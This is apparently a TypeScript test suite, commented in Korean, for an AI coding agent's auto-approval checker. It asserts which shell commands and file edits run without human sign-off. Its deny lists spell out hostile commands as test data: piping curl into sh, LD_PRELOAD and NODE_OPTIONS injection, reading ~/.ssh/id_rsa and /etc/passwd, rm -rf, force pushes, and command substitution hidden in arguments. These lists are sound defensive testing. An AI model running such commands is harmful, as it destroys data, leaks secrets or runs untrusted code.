// U-02 — 허가 요청을 묻지 않고 통과시키는 판정. **틀리면 사람에게 묻지 않고 명령이 실행된다** — 그래서
// "통과해야 하는 것" 보다 "통과하면 안 되는 것" 을 훨씬 많이 적어 둔다.
import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  decideAutoApproval,
  editTargets,
  isApprovalPolicy,
  outsidePathIn,
  pathVerdict,
  plainShellVerdict,
  shellTrickery,
  strictReadOnlyVerdict,
  type ApprovalPolicy,
} from '../../src/adapters/autoApproval.js';

let cwd: string;
let outside: string;

before(() => {
  // realpath 를 실제로 태운다(맥의 /var → /private/var 도 여기서 걸러진다).
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'pixel-auto-')));
  cwd = path.join(root, 'project');
  outside = path.join(root, 'elsewhere');
  fs.mkdirSync(path.join(cwd, 'src'), { recursive: true });
  fs.mkdirSync(outside, { recursive: true });
  fs.writeFileSync(path.join(cwd, 'src', 'a.ts'), 'x');
  // 폴더 안에 있지만 밖을 가리키는 심볼릭 링크.
  if (process.platform !== 'win32') fs.symlinkSync(outside, path.join(cwd, 'escape'));
});
after(() => fs.rmSync(path.dirname(cwd), { recursive: true, force: true }));

const bash = (command: string) => ({ toolName: 'Bash', toolInput: { command }, cwd });
const edit = (file_path: string) => ({ toolName: 'Edit', toolInput: { file_path, old_string: 'a', new_string: 'b' }, cwd });
const allowed = (policy: ApprovalPolicy, input: { toolName: string; toolInput: unknown; cwd: string }) => decideAutoApproval(policy, input).allow;

describe('허가 방식 값', () => {
  test('ask · edits · trust 셋뿐', () => {
    for (const p of ['ask', 'edits', 'trust']) assert.ok(isApprovalPolicy(p));
    for (const p of ['', 'all', 'TRUST', null, undefined, 3]) assert.ok(!isApprovalPolicy(p));
  });

  test('ask 는 무엇도 통과시키지 않는다 — 지금까지의 동작 그대로', () => {
    assert.equal(allowed('ask', edit('src/a.ts')), false);
    assert.equal(allowed('ask', bash('ls')), false);
    // 모르는 값이 들어와도 ask 처럼 군다.
    assert.equal(decideAutoApproval('whatever' as ApprovalPolicy, bash('ls')).allow, false);
  });

  test('작업 폴더를 모르면(빈 값 · 상대 경로) 묻는다', () => {
    assert.equal(decideAutoApproval('trust', { toolName: 'Bash', toolInput: { command: 'ls' }, cwd: '' }).allow, false);
    assert.equal(decideAutoApproval('trust', { toolName: 'Bash', toolInput: { command: 'ls' }, cwd: 'relative/dir' }).allow, false);
  });
});

describe('경로: 작업 폴더 안인가', () => {
  test('안: 상대 · 절대 · 아직 없는 새 파일 · 깊은 새 폴더', () => {
    for (const p of ['src/a.ts', './src/a.ts', path.join(cwd, 'src', 'a.ts'), 'new.txt', 'a/b/c/new.txt', 'src/../src/a.ts']) {
      assert.ok(pathVerdict(cwd, p).inside, p);
    }
  });

  test('밖: 부모 · 형제 · 절대 경로 · 홈 · 폴더 자체', () => {
    for (const p of ['../x', '../../x', 'src/../../x', outside, path.join(outside, 'x'), '/etc/passwd', '~/x', '~', '.', '', cwd]) {
      assert.ok(!pathVerdict(cwd, p).inside, JSON.stringify(p));
    }
  });

  test('밖: 폴더 안의 심볼릭 링크가 밖을 가리키면 밖이다', { skip: process.platform === 'win32' }, () => {
    assert.ok(!pathVerdict(cwd, 'escape/x.txt').inside);
    assert.ok(!pathVerdict(cwd, 'escape/new/deep.txt').inside);
  });

  test('밖 취급: 다른 플랫폼의 절대 경로(posix 에서는 "이상한 이름의 상대 경로" 로 풀린다)', { skip: process.platform === 'win32' }, () => {
    assert.ok(!pathVerdict(cwd, 'C:\\Windows\\x').inside);
    assert.ok(!pathVerdict(cwd, '\\\\server\\share\\x').inside);
  });

  test('보호: 폴더 안이어도 .git · .claude · .codex · 비밀 파일은 자동으로 안 건드린다', () => {
    const guarded = [
      '.git/config', '.git/hooks/pre-commit', 'sub/.git/HEAD', '.claude/settings.json', '.claude/settings.local.json', '.codex/config.toml',
      '.ssh/id_rsa', '.env', '.env.local', '.ENV', 'config/.env.production', '.envrc', 'certs/server.pem', 'k.key', 'id_ed25519', '.npmrc',
      '.netrc', '.mcp.json',
    ];
    for (const p of guarded) assert.ok(!pathVerdict(cwd, p).inside, p);
    // 이름이 비슷할 뿐인 것은 괜찮다.
    for (const p of ['env.ts', 'src/environment.ts', 'docs/git.md', 'keys.ts', 'mcp.json', '.gitignore', '.github/workflows/ci.yml']) {
      assert.ok(pathVerdict(cwd, p).inside, p);
    }
  });
});

describe('편집 도구', () => {
  test('edits: 폴더 안의 Edit/Write/MultiEdit/NotebookEdit 는 통과', () => {
    assert.deepEqual(decideAutoApproval('edits', edit('src/a.ts')).rule, 'edit-in-cwd');
    assert.ok(allowed('edits', { toolName: 'Write', toolInput: { file_path: path.join(cwd, 'new.md'), content: 'x' }, cwd }));
    assert.ok(allowed('edits', { toolName: 'MultiEdit', toolInput: { file_path: 'src/a.ts', edits: [] }, cwd }));
    assert.ok(allowed('edits', { toolName: 'NotebookEdit', toolInput: { notebook_path: 'nb/a.ipynb' }, cwd }));
  });

  test('폴더 밖 · 보호 대상 · 경로 없음은 어느 방식에서도 묻는다', () => {
    for (const policy of ['edits', 'trust'] as const) {
      for (const p of ['../x.ts', '/etc/hosts', '~/.zshrc', '.git/config', '.env', '.claude/settings.json']) {
        assert.equal(allowed(policy, edit(p)), false, `${policy} ${p}`);
      }
      assert.equal(allowed(policy, { toolName: 'Edit', toolInput: {}, cwd }), false);
      assert.equal(allowed(policy, { toolName: 'Edit', toolInput: null, cwd }), false);
    }
  });

  test('Codex apply_patch: 건드리는 파일이 **전부** 폴더 안이어야 한다', () => {
    const patch = (...lines: string[]) => ({ toolName: 'apply_patch', toolInput: { command: ['*** Begin Patch', ...lines, '*** End Patch'].join('\n') }, cwd });
    assert.ok(allowed('edits', patch('*** Add File: src/new.ts', '+x')));
    assert.ok(allowed('edits', patch('*** Update File: src/a.ts', '@@', '-x', '+y', '*** Add File: docs/b.md', '+z')));
    assert.equal(allowed('edits', patch('*** Update File: src/a.ts', '*** Add File: ../leak.txt', '+z')), false, '하나라도 밖이면');
    assert.equal(allowed('edits', patch('*** Update File: src/a.ts', '*** Move to: ../moved.ts')), false, '옮겨 갈 곳이 밖');
    assert.equal(allowed('edits', patch('+x')), false, '파일 줄을 못 읽으면 모르는 것');
    // 실측 페이로드(T42): 윈도우 절대 경로. 맥에서는 "다른 플랫폼 경로" 라 묻는다.
    const win = patch('*** Add File: D:\\myproject\\sandbox\\t42.txt', '+hello');
    if (process.platform !== 'win32') assert.equal(allowed('edits', win), false);
  });

  test('파일을 지우는 패치: edits 는 묻고 trust 는 폴더 안이면 통과', () => {
    const del = { toolName: 'apply_patch', toolInput: { command: '*** Begin Patch\n*** Delete File: src/a.ts\n*** End Patch' }, cwd };
    assert.equal(allowed('edits', del), false);
    assert.ok(allowed('trust', del));
    const delOut = { toolName: 'apply_patch', toolInput: { command: '*** Begin Patch\n*** Delete File: ../x\n*** End Patch' }, cwd };
    assert.equal(allowed('trust', delOut), false);
  });

  test('셸로 부른 apply_patch 도 편집으로 본다', () => {
    const cmd = "apply_patch <<'EOF'\n*** Begin Patch\n*** Add File: src/n.ts\n+x\n*** End Patch\nEOF";
    assert.deepEqual(decideAutoApproval('edits', bash(cmd)).rule, 'edit-in-cwd');
    assert.equal(allowed('edits', bash(cmd.replace('src/n.ts', '/etc/n.ts'))), false);
  });

  test('editTargets: 못 읽으면 null', () => {
    assert.deepEqual(editTargets({ file_path: 'a' }), { paths: ['a'], deletes: false });
    assert.equal(editTargets({}), null);
    assert.equal(editTargets('x'), null);
    assert.equal(editTargets({ command: '*** Begin Patch\n*** End Patch' }), null);
  });
});

describe('셸 ①: 읽기만 하는 명령 (edits 이상)', () => {
  const yes = [
    'ls', 'ls -la src', 'cat src/a.ts', 'head -n 20 src/a.ts', 'tail -5 src/a.ts', 'wc -l src/a.ts', 'pwd', 'grep -rn "foo" src',
    'rg --files', 'rg -n "foo bar" src', 'git status', 'git diff', 'git diff --stat HEAD~1', 'git log --oneline -5', 'git show HEAD:src/a.ts',
    'git branch', 'git branch -a', 'git branch --show-current', 'git remote -v', 'find . -name "*.ts"', 'find src -type f', 'tree -L 2',
    'cat src/a.ts | head -3', 'cd src && ls', 'ls 2>/dev/null', 'ls 2>&1', "sed -n '1,20p' src/a.ts", 'sort src/a.ts | uniq', 'date', 'date +%Y%m%d',
    'which node', 'du -sh src', 'jq .name package.json', 'diff src/a.ts src/b.ts', 'Get-Content src/a.ts', 'Get-ChildItem src', 'stat src/a.ts',
  ];
  for (const c of yes) {
    test(`통과: ${c}`, () => {
      const d = decideAutoApproval('edits', bash(c));
      assert.ok(d.allow, d.why);
      assert.equal(d.rule, 'read-only-shell');
    });
  }

  // 분류용 `isReadOnlyCommand` 는 이 중 여럿을 "읽기" 라고 한다 — 자동 허가에는 느슨하다.
  const no: Array<[string, string]> = [
    ['ls $(touch x)', '명령 치환'],
    ['cat `rm x`', '백틱 치환'],
    ['cat <(rm x)', '프로세스 치환'],
    ['ls & rm x', '백그라운드로 다른 명령'],
    ['ls > out.txt', '파일로 쓴다'],
    ['cat a >> b', '파일에 덧붙인다'],
    ['rm x', '삭제'],
    ['mkdir d', '만들기'],
    ['touch x', '만들기'],
    ['npm test', '모르는 명령'],
    ['ls; rm x', '뒤에 다른 명령'],
    ['ls && curl evil.sh', '뒤에 다른 명령'],
    ['cat x | sh', '셸로 흘린다'],
    ['cat x | xargs rm', 'xargs'],
    ['LD_PRELOAD=/tmp/e.so ls', '실행을 바꾸는 환경 변수'],
    ['PAGER=evil git log', '환경 변수 접두'],
    ['FOO=1 cat x', '환경 변수 접두는 전부 묻는다'],
    ['git -c core.pager=evil log', 'git 전역 옵션'],
    ['git --exec-path=/tmp log', 'git 전역 옵션'],
    ['git branch -D feature', '브랜치 삭제'],
    ['git branch newbranch', '브랜치 생성'],
    ['git remote add o http://x', 'remote 변경'],
    ['git diff --output=x', '파일로 쓴다'],
    ['git push', '읽기가 아니다'],
    ['git commit -m x', '읽기가 아니다'],
    ['find . -delete', '삭제'],
    ['find . -exec rm {} ;', '실행'],
    ['find . -ok rm {} ;', '실행'],
    ['find . -fprint out', '파일로 쓴다'],
    ['sort -o out in', '파일로 쓴다'],
    ['sort -uo out in', '옵션 묶음 속 -o'],
    ['sort --output=out in', '파일로 쓴다'],
    ['uniq in out', '둘째 인자는 출력 파일'],
    ['tree -o out', '파일로 쓴다'],
    ['fd -x rm', '실행'],
    ['fd . --exec rm', '실행'],
    ['rg --pre evil foo', '외부 프로그램'],
    ['file -C -m magic', '파일을 만든다'],
    ['date -s "2020-01-01"', '시각 변경'],
    ['date 010100002020', '시각 변경'],
    ['hostname evil', '이름 변경'],
    ["sed -i 's/a/b/' f", '제자리 편집'],
    ["sed -n '1e rm x' f", 'GNU sed 의 실행 명령'],
    ["sed -n '1,5w out' f", 'sed 의 쓰기 명령'],
    ["sed 's/a/b/' f", '-n p 꼴이 아니다'],
    ['less f', '페이저'],
    ["less '+!rm x' f", '페이저의 시작 명령'],
    ['more f', '페이저'],
    ['Get-Content (Remove-Item x)', 'PowerShell 괄호 안의 명령'],
    ['Get-ChildItem | ForEach-Object { Remove-Item $_ }', '스크립트 블록'],
    ['ls {a,b}', '중괄호(보수적으로 묻는다)'],
    ['"l"s', '따옴표를 끼운 이름'],
    ['c\\at x', '역슬래시를 끼운 이름'],
    ['$CMD x', '변수가 이름'],
  ];
  for (const [c, why] of no) {
    test(`묻는다: ${c} — ${why}`, () => assert.equal(allowed('edits', bash(c)), false, decideAutoApproval('edits', bash(c)).why));
  }

  test('읽기 명령이라도 폴더 밖을 읽으면 묻는다', () => {
    for (const c of ['cat /etc/passwd', 'cat ~/.ssh/id_rsa', 'ls ..', 'cat ../secret', 'head $HOME/.zshrc', 'grep -r key ~', `cat ${path.join(outside, 'x')}`, 'cd / && ls']) {
      assert.equal(allowed('edits', bash(c)), false, c);
      assert.equal(allowed('trust', bash(c)), false, c);
    }
  });

  test('strictReadOnlyVerdict: 이유를 돌려준다', () => {
    assert.match(strictReadOnlyVerdict('ls $(x)').why, /치환/);
    assert.match(strictReadOnlyVerdict('npm test').why, /목록에 없는/);
    assert.equal(strictReadOnlyVerdict('ls').ok, true);
  });
});

describe('셸 ②: 평범한 명령 (trust)', () => {
  test('edits 에서는 읽기가 아닌 셸을 전부 묻는다', () => {
    for (const c of ['npm test', 'mkdir d', 'git add .', 'git commit -m x', 'python build.py', 'touch x', 'echo hi > out.txt']) {
      assert.equal(allowed('edits', bash(c)), false, c);
    }
  });

  const yes = [
    'npm test', 'npm install', 'npm run build', 'pnpm install', 'npx tsc --noEmit', 'yarn lint', 'mkdir -p src/new', 'touch src/x.ts', 'cp src/a.ts src/b.ts',
    'mv src/a.ts src/c.ts', 'rm src/old.ts', 'echo hi > out.txt', 'echo hi >> out.txt', 'node build.js', 'python scripts/gen.py', 'python -m pytest',
    'python3 -m venv .venv', 'pip install -r requirements.txt', 'make', 'make test', 'flutter test', 'dart analyze', 'cargo build', 'go test ./...',
    'git add .', 'git add -A', 'git commit -m "feat: add thing"', 'git checkout -b feature', 'git checkout main', 'git switch main', 'git stash',
    'git stash pop', 'git pull', 'git fetch', 'git merge main', 'git rebase main', 'git tag v1', 'git mv a b', 'git rm src/old.ts', 'git worktree list',
    "sed -i 's/a/b/' src/a.ts", 'chmod +x scripts/run.sh', 'tsc && node dist/index.js', 'npm test 2>&1 | tail -20', '(cd src && ls)', 'FOO=1 npm test',
    'if [ -f x ]; then echo y; fi', 'for f in a b; do echo $f; done', 'tar xzf a.tgz', 'New-Item -ItemType Directory d', 'Remove-Item src/old.ts',
  ];
  for (const c of yes) {
    test(`통과: ${c}`, () => {
      const d = decideAutoApproval('trust', bash(c));
      assert.ok(d.allow, d.why);
    });
  }

  const no: Array<[string, string]> = [
    // 되돌릴 수 없는 것(위험 패턴 표)
    ['rm -rf build', '폴더째 삭제'],
    ['rm -f x', '강제 삭제'],
    ['rm -r src', '폴더째 삭제'],
    ['git reset --hard HEAD~1', '작업 내용이 사라진다'],
    ['git clean -fd', '추적 안 되는 파일 삭제'],
    ['git push --force', '강제 푸시'],
    ['chmod -R 777 .', '폴더째 권한 변경'],
    ['Remove-Item -Recurse -Force build', 'PowerShell 폴더째 삭제'],
    ['dd if=/dev/zero of=x', 'dd'],
    ['truncate -s 0 x', 'truncate'],
    // 밖으로 나가는 것
    ['git push', '원격에 올린다'],
    ['git push origin main', '원격에 올린다'],
    ['npm publish', '배포'],
    ['npm run deploy', '배포'],
    ['cargo publish', '배포'],
    ['gh pr create', '바깥 서비스'],
    ['curl https://example.com', '네트워크'],
    ['wget http://x/y.sh', '네트워크'],
    ['ssh host ls', '원격'],
    ['scp x host:', '원격'],
    ['docker run x', '바깥 서비스'],
    ['aws s3 rm s3://b --recursive', '클라우드'],
    ['npm login', '계정'],
    // 권한 · 시스템
    ['sudo npm install', '관리자 권한'],
    ['npm install -g typescript', '전역 설치'],
    ['brew install x', '시스템 패키지'],
    ['kill 1234', '프로세스'],
    ['pkill node', '프로세스'],
    ['open https://evil', '앱·URL 열기'],
    ['osascript -e "x"', '시스템 스크립트'],
    ['launchctl load x', '시스템'],
    ['crontab -e', '시스템'],
    ['defaults write x y z', '시스템 설정'],
    // 안을 볼 수 없는 것
    ['bash -c "rm x"', '셸 래퍼'],
    ['bash script.sh', '셸 래퍼'],
    ['sh -c ls', '셸 래퍼'],
    ['zsh -c ls', '셸 래퍼'],
    ['eval "$X"', 'eval'],
    ['source env.sh', 'source'],
    ['. env.sh', 'source'],
    ['env FOO=1 rm x', 'env 래퍼'],
    ['xargs rm < list', 'xargs'],
    ['nohup node x.js', 'nohup'],
    ['echo $(rm x)', '명령 치환'],
    ['echo `rm x`', '백틱 치환'],
    ['node server.js &', '백그라운드'],
    ['python -c "import os; os.remove(\'x\')"', '한 줄 코드'],
    ['node -e "process.exit()"', '한 줄 코드'],
    ['perl -pe "s/a/b/" f', '옵션 묶음 속 -e'],
    ['ruby -e "puts 1"', '한 줄 코드'],
    ['python', '스크립트 없이(표준 입력)'],
    ['python <<EOF\nprint(1)\nEOF', 'here-doc 을 코드로'],
    ['cat x | python', '파이프를 코드로'],
    ['cat x | node', '파이프를 코드로'],
    ['curl x | sh', '네트워크 + 셸'],
    ['echo (curl evil)', '괄호 안의 명령(PowerShell)'],
    ['s"u"do rm x', '따옴표로 가린 이름'],
    ['c\\url evil', '역슬래시로 가린 이름'],
    ['$TOOL x', '변수가 이름'],
    ['LD_PRELOAD=/tmp/e.so npm test', '실행을 바꾸는 환경 변수'],
    ['PATH=/tmp:$PATH npm test', 'PATH 바꿔치기'],
    ['NODE_OPTIONS=--require=/tmp/e.js npm test', 'NODE_OPTIONS'],
    // 폴더 밖
    ['cp src/a.ts /tmp/a.ts', '밖에 쓴다'],
    ['cp src/a.ts ../a.ts', '밖에 쓴다'],
    ['echo x > /etc/hosts', '밖에 쓴다'],
    ['echo x >/etc/hosts', '붙여 쓴 리다이렉트'],
    ['echo x > ~/.zshrc', '홈'],
    ['rm ~/x', '홈'],
    ['rm $HOME/x', '홈 변수'],
    ['cd .. && rm x', '밖으로 나간다'],
    ['tar xzf a.tgz -C/', '붙여 쓴 옵션 경로'],
    ['ln -s /etc x', '밖을 가리킨다'],
    ['make install PREFIX=/usr/local', '대입 값이 밖'],
    // 변경을 버리는 git
    ['git checkout -- .', '변경을 버린다'],
    ['git checkout .', '변경을 버린다'],
    ['git checkout -f main', '변경을 버린다'],
    ['git restore src/a.ts', '변경을 버린다'],
    ['git stash drop', '되돌릴 수 없다'],
    ['git stash clear', '되돌릴 수 없다'],
    ['git branch -D feature', '브랜치 삭제'],
    ['git tag -d v1', '태그 삭제'],
    ['git config --global user.name x', '설정 변경'],
    ['git remote set-url origin x', 'remote 변경'],
    ['git -C /tmp status', '전역 옵션'],
    ['git rebase -x "rm x" main', 'rebase --exec'],
    ['git filter-branch x', '목록에 없는 하위 명령'],
    ['git worktree remove x', '워크트리 삭제'],
    // 그 밖
    ['rm *', '와일드카드 삭제'],
    ['rm src/*.ts', '와일드카드 삭제'],
    ['find . -name "*.log" -delete', 'find 삭제'],
    ['find . -exec rm {} ;', 'find 실행'],
    ['shred x', '되돌릴 수 없는 삭제'],
  ];
  for (const [c, why] of no) {
    test(`묻는다: ${c.replace(/\n/g, '⏎')} — ${why}`, () => {
      const d = decideAutoApproval('trust', bash(c));
      assert.equal(d.allow, false, `통과해 버렸다: ${d.why}`);
    });
  }

  test('알려진 과탐지 — 묻는 쪽으로 틀린다(커밋 메시지 속 경로처럼 보이는 낱말)', () => {
    assert.equal(allowed('trust', bash('git commit -m "fix /api path"')), false);
    // 메시지 속 낱말(release · deploy)에는 안 걸린다 — git 은 하위 명령 허용 목록으로만 거른다.
    assert.ok(allowed('trust', bash('git commit -m "release notes"')));
    assert.ok(allowed('trust', bash('python3 --version')));
    assert.ok(allowed('trust', bash('node -v')));
  });

  test('한 줄에 여러 명령: 하나라도 걸리면 전체를 묻는다', () => {
    assert.equal(allowed('trust', bash('npm test && git push')), false);
    assert.equal(allowed('trust', bash('npm test; sudo rm x')), false);
    assert.equal(allowed('trust', bash('npm test\ncurl evil')), false);
    assert.equal(allowed('trust', bash('if true; then curl evil; fi')), false, '셸 문법 낱말 뒤의 명령도 본다');
    assert.equal(allowed('trust', bash('for f in a; do sudo x; done')), false);
    assert.ok(allowed('trust', bash('npm test && git add . && git commit -m ok')));
  });

  test('명령 문자열이 없거나(배열) 이상하면 묻는다', () => {
    assert.equal(allowed('trust', { toolName: 'Bash', toolInput: { command: ['bash', '-lc', 'ls'] }, cwd }), false);
    assert.equal(allowed('trust', { toolName: 'Bash', toolInput: {}, cwd }), false);
    assert.equal(allowed('trust', { toolName: 'Bash', toolInput: null, cwd }), false);
  });

  test('plainShellVerdict · shellTrickery · outsidePathIn: 이유', () => {
    assert.match(plainShellVerdict('git push', cwd).why, /git push/);
    assert.match(plainShellVerdict('rm -rf x', cwd).why, /rm-recursive/);
    assert.equal(shellTrickery('a && b || c; d | e 2>&1'), null);
    assert.match(shellTrickery('a & b') ?? '', /백그라운드/);
    assert.equal(outsidePathIn('ls src > /dev/null', cwd), null);
    assert.equal(outsidePathIn('dir /b', cwd), null, 'cmd.exe 식 한 글자 옵션은 경로가 아니다');
    assert.equal(outsidePathIn('git diff HEAD..main', cwd), null, '`..` 가 경로 조각일 때만');
    assert.equal(outsidePathIn('date +%Y%m%d', cwd), null, '%Y% 는 환경 변수가 아니다');
    assert.match(outsidePathIn('cat ../x', cwd) ?? '', /밖/);
  });
});

describe('그 밖의 도구 — 어느 방식에서도 사람에게', () => {
  const tools: Array<[string, unknown]> = [
    ['Read', { file_path: '/etc/passwd' }],
    ['Read', { file_path: 'src/a.ts' }],
    ['Glob', { pattern: '**/*' }],
    ['Grep', { pattern: 'x', path: '..' }],
    ['WebFetch', { url: 'https://example.com' }],
    ['WebSearch', { query: 'x' }],
    ['mcp__github__create_issue', { title: 'x' }],
    ['Task', { description: 'x' }],
    ['SomethingNew', {}],
  ];
  for (const [toolName, toolInput] of tools) {
    test(`${toolName}`, () => {
      assert.equal(allowed('edits', { toolName, toolInput, cwd }), false);
      assert.equal(allowed('trust', { toolName, toolInput, cwd }), false);
    });
  }

  test('판정이 던져도 묻는 쪽으로 떨어진다', () => {
    const d = decideAutoApproval('trust', edit('src/a.ts'), {
      realpath: () => {
        throw new Error('boom');
      },
    });
    // realpath 가 전부 실패하면 경로를 그대로 쓴다 — 던지지 않고, 폴더 안 판정은 글자 그대로 한다.
    assert.equal(typeof d.allow, 'boolean');
  });
});
